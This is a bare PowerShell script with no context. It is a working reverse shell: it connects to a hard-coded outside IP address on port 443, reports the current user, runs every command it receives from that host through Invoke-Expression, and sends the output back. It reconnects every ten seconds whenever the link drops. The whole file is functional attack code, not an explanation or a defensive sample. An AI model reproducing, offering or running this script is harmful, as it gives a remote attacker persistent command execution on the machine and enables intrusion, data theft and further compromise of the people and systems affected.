$ip = "164.92.236.24"
$port = 443
$retryDelay = 10
while ($true) {
    try {
        Write-Host "Connecting to $ip`:$port..." -ForegroundColor Cyan
        $t = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $s = $t.GetStream()
        $r = New-Object System.IO.StreamReader($s)
        $w = New-Object System.IO.StreamWriter($s)
        $w.AutoFlush = $true

        Write-Host "Connected!" -ForegroundColor Green
        $w.WriteLine("--- Connected: $(whoami) ---")

        while($t.Connected) {
            $w.Write("PS > ")
            $c = $r.ReadLine()

            if ($null -eq $c) { break }
            if ([string]::IsNullOrWhiteSpace($c)) { continue }

            try {
                $out = Invoke-Expression $c 2>&1 | Out-String
                if ($out) { $w.WriteLine($out) } else { $w.WriteLine(" ") }
            } catch {
                $w.WriteLine("Error: " + $_.Exception.Message)
            }
        }
    } catch {
        Write-Host "Connection Error: $($_.Exception.Message)" -ForegroundColor Yellow
    }
    if ($r) { $r.Close() }
    if ($w) { $w.Close() }
    if ($s) { $s.Close() }
    if ($t) { $t.Close() }

    Write-Host "Retrying in $retryDelay sec..." -ForegroundColor Cyan
    Start-Sleep -Seconds $retryDelay
}
